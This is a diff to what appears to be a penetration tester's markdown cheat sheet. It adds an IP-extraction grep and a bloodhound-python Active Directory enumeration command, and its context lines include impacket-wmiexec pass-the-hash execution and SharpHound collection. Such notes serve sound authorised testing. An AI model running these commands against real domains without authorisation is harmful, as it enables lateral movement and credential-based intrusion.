@@ -1,4 +1,8 @@
 #### Run Run ####
+---------------------
+**grep IP***
+grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+---------------------
 
 **Mount**
 ---------------------
@@ -82,7 +86,10 @@ impacket-wmiexec <domain>/<user>@<IP> -hashes :<hash>
 
 
 -----------------------------------
-
+****Bloodhound-python****
+-----------------------------------
+bloodhound-python -u user@full-domain -p 'PASS' -d full-domain -ns dc-ip -c all
+-----------------------------------4
 **BloodHound**
 --------------------
 - execute-assembly /path/to/sharphound.exe --CollectionMethod  All --NoSaveCache --CompressData
